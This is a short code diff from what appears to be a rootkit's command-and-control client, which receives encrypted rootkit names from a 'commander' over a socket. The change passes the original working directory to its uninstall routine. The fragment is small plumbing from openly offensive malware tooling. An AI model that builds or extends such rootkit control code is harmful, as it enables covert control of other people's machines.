@@ -278,14 +278,15 @@ if __name__ == '__main__':
                     # Receive rootkit name from commander
                     print(constants.CLIENT_RESPONSE.format(constants.UNINSTALL))
                     rootkit_names = decrypt_string(client_socket.recv(1024).decode(), shared_secret).split("/")
+                    original_path = os.getcwd()
 
                     # Perform Uninstall
                     try:
-                        uninstall(rootkit_names[0])
+                        uninstall(rootkit_names[0], original_path)
                     except FileNotFoundError as e:
                         print("[+] UNINSTALL ERROR: An error has occurred {}".format(e))
                         print("[+] Re-attempting with alternate project name...")
-                        uninstall(rootkit_names[1])
+                        uninstall(rootkit_names[1], original_path)
 
         except ConnectionResetError:
             print("[+] The client {}:{} disconnected unexpectedly.".format(client_address[0], client_address[1]))
